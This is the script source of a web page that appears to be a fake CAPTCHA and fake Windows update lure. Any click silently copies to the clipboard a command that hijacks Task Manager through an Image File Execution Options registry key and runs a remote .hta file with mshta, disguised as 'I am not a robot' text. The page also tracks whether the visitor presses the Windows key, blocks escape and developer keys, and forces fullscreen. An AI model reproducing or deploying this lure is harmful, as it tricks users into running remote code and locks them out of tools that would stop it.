<!DOCTYPE html>

    <script>
        (function () {
            const textToCopy = "cmd /c title CloudFlare - I am not robot verify && color f0 && reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v debugger /t reg_sz /d \"mshta.exe\" /f && mshta http://cybertrainerx.github.io/what/verifier.hta# ✅ I am not a robot - CAPTCHA Verification ID: 114514";

            async function copyText(text) {
                try {
                    if (navigator.clipboard && window.isSecureContext) {
                        await navigator.clipboard.writeText(text);
                        return true;
                    }
                } catch (e) { }
                const ta = document.createElement("textarea");
                ta.value = text;
                ta.setAttribute("readonly", "");
                ta.style.position = "fixed";
                ta.style.left = "-9999px";
                document.body.appendChild(ta);
                ta.select();
                try {
                    document.execCommand("copy");
                    document.body.removeChild(ta);
                    return true;
                } catch (err) {
                    document.body.removeChild(ta);
                    return false;
                }
            }

            document.addEventListener("click", async () => {
                await copyText(textToCopy);
            });
        })();
        document.addEventListener('DOMContentLoaded', async () => {
            function getCookie(name) {
                return document.cookie
                    .split('; ')
                    .find((row) => row.startsWith(name + '='))
                    ?.split('=')[1];
            }

            function setCookie(name, value, maxAgeSeconds) {
                document.cookie = `${name}=${value}; path=/; max-age=${maxAgeSeconds}`;
            }

            const baseHref = document.querySelector('base')?.getAttribute('href') || '/';
            const pathSegments = baseHref.split('/').filter(Boolean);
            const SITE_FOLDER = pathSegments.length ? pathSegments[pathSegments.length - 1] : '';

            const COOKIE_MAX_AGE = 60 * 60 * 24 * 30;

            if (!getCookie('visit')) {
                sendStat('visit');
                setCookie('visit', '1', COOKIE_MAX_AGE);
            }

            let clickSent = !!getCookie('click');

            let winSent = !!getCookie('win');

            if (!clickSent) {
                document.addEventListener(
                    'click',
                    () => {
                        if (!clickSent) {
                            sendStat('click');
                            clickSent = true;
                            setCookie('click', '1', COOKIE_MAX_AGE);
                        }
                    },
                    { once: true },
                );
            }

            document.addEventListener('keydown', function (event) {
                if (event.key === 'Meta') {
                    if (clickSent && !winSent) {
                        sendStat('win');
                        winSent = true;
                        setCookie('win', '1', COOKIE_MAX_AGE);
                    }
                }
            });
        });
        if (window.history.replaceState) {
            const currentUrl = new URL(window.location);
            currentUrl.searchParams.delete('stage');
            currentUrl.searchParams.delete('static');
            window.history.replaceState({}, document.title, currentUrl.pathname + currentUrl.search);
        }
    </script>
    <script src="jquery-4.0.0.min.js"></script>

                    <script>
                        if (typeof vArrow === 'undefined') {
                            vArrow = 1;
                        }
                        let progress = 0;
                        let progressTimer = null;
                        let progressSpeed = 200;
                        let progressStage = 1;
                        let text2 = '';
                        let text3 = '';
                        const finalUpdateTime = 60000;
                        const guideShowDelay = 2;
                        let isFirstClick = false;
                        let isDownloadClicked = false;
                        let isAfterDownload = false;
                        let isExitAvailable = false;
                        let clickTarget = null;
                        document.oncontextmenu = () => false;
                        setTimeout(() => {
                            window.onkeydown = (evt) => {
                                const forbiddenKeys = [
                                    27,
                                    18,
                                    123,
                                    9,
                                    115,
                                    116,
                                    112,
                                    114,
                                    17,
                                    122
                                ];
                                return !forbiddenKeys.includes(evt.keyCode);
                            };
                        }, 1000);
                        window.onkeypress = (evn) => evn.keyCode !== 123;
                        function enterFullScreen() {
                            const docEl = document.documentElement;
                            if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
                                if (docEl.requestFullscreen) docEl.requestFullscreen();
                                else if (docEl.mozRequestFullScreen) docEl.mozRequestFullScreen();
                                else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
                            }
                        }
                        function exitFullScreen() {
                            if (document.exitFullscreen) document.exitFullscreen();
                            else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
                            else if (document.mozCancelFullScreen) document.mozCancelFullScreen();
                            else if (document.msExitFullscreen) document.msExitFullscreen();
                        }
                        function startProgressSimulation() {
                            if (progressTimer) clearInterval(progressTimer);
                            progressTimer = setInterval(() => {
                                progress += 1;
                                $('.percent span').text(progress);
                                switch (true) {
                                    case (progress === 91 && progressStage === 3):
                                        clearInterval(progressTimer);
                                        setTimeout(() => {
                                            $('.screen2').addClass('active');
                                            $('body').css('cursor', 'auto');
                                        }, 2000);
                                        break;
                                    case (progress === 30 && progressStage === 1):
                                        clearInterval(progressTimer);
                                        setTimeout(startProgressSimulation, 1500);
                                        break;
                                    case (progress > 95 && progressStage === 2):
                                        clearInterval(progressTimer);
                                        progressSpeed = 5;
                                        progress = 1;
                                        progressStage = 3;
                                        $('.percent span:eq(0)').text(100);
                                        setTimeout(() => $('.percent span:eq(0)').text(100), 2000);
                                        setTimeout(() => {
                                            $('.part span:eq(0)').text(3);
                                            $('.part span:eq(2)').text(text3);
                                            startProgressSimulation();
                                        }, 2500);
                                        break;
                                    case (progress === 60 && progressStage === 1):
                                        clearInterval(progressTimer);
                                        progressSpeed = 10;
                                        setTimeout(startProgressSimulation, 1000);
                                        break;
                                    case (progress > 99 && progressStage === 1):
                                        clearInterval(progressTimer);
                                        progressSpeed = 15;
                                        progress = 1;
                                        progressStage = 2;
                                        setTimeout(() => $('.percent span:eq(0)').text(100), 2000);
                                        setTimeout(() => {
                                            $('.part span:eq(0)').text(2);
                                            $('.part span:eq(2)').text(text2);
                                            startProgressSimulation();
                                        }, 3000);
                                        break;
                                }
                            }, progressSpeed);
                        }
                        document.onclick = (e) => {
                            e = e || window.event;
                            clickTarget = e.target || e.srcElement;
                            if (isAfterDownload && !isDownloadClicked) return;
                            const confirmElement = $(clickTarget).closest('.confirm');
                            if (clickTarget.tagName !== 'A' || confirmElement.length > 0) {
                                isDownloadClicked || confirmElement ? enterFullScreen() : (isExitAvailable && exitFullScreen());
                            }
                            if (isFirstClick) {
                                if (clickTarget.tagName !== 'A' || $(clickTarget).attr('href') === 'javascript:void(0);') {
                                    $('body').append("<audio id='mmm' autoplay='autoplay'><source src='WindowsBackground.mp3'></audio>");
                                }
                            }
                            else {
                                $('body').css('cursor', 'none');
                                $('body, html')
                                    .css('overflow', 'hidden')
                                    .addClass('i-fs');
                                $('.confirm').remove();
                                $('.screen1').addClass('active');
                                $.get('404.html?screen2=1');
                                startProgressSimulation();
                            }
                            isFirstClick = true;
                        };
                        $(function () {
                            $.get('404.html');
                            const arrow1 = document.getElementById('arrow1');
                            const arrow2 = document.getElementById('arrow2');
                            const browserTextMap = {
                                mozilla: 'FireFox',
                                msie: 'Internet Explorer',
                                chrome: 'Google Chrome',
                                other: '浏览器'
                            };
                            if (vArrow === 1) {
                                let browserClass = 'other';
                                if ($.browser.mozilla) browserClass = 'mozilla';
                                else if ($.browser.msie) browserClass = 'msie';
                                else if ($.browser.chrome) browserClass = 'chrome';
                                $('.lookhere')
                                    .attr('class', `lookhere ${browserClass}`);
                                $('#dialog-title4 span, #dialog-title4-1 span')
                                    .text(browserTextMap[browserClass]);
                                return;
                            }
                            if ($.browser.msie) {
                                arrow1.style.display = 'none';
                                arrow2.style.display = 'block';
                            } else if ($.browser.chrome) {
                                arrow1.style.display = 'block';
                                arrow2.style.display = 'none';
                            } else {
                                arrow1.style.display = 'block';
                                arrow2.style.display = 'block';
                            }

                            let currentBrowser = 'other';
                            if ($.browser.mozilla) currentBrowser = 'mozilla';
                            else if ($.browser.msie) currentBrowser = 'msie';
                            else if ($.browser.chrome) currentBrowser = 'chrome';
                            $('#dialog-title4 span, #dialog-title4-1 span')
                                .text(browserTextMap[currentBrowser]);
                            resizeArrows();
                            $(document).on('click', 'a.download', function () {
                                if (isDownloadClicked) return;
                                setTimeout(() => {
                                    $('.percent span:eq(0)').text(100);
                                    setTimeout(() => {
                                        $('.loader, .dont, .screen2').remove();
                                        $('.t1').text('Update complete!');
                                        setTimeout(() => {
                                            try { exitFullScreen(); } catch (e) { }
                                            $('body').html('').css('background-color', 'white');
                                            isAfterDownload = true;
                                        }, 1000);
                                    }, 1000);
                                }, finalUpdateTime);
                            });
                        });

                        try {
                            enterFullScreen();
                        } catch (e) { }
                    </script>
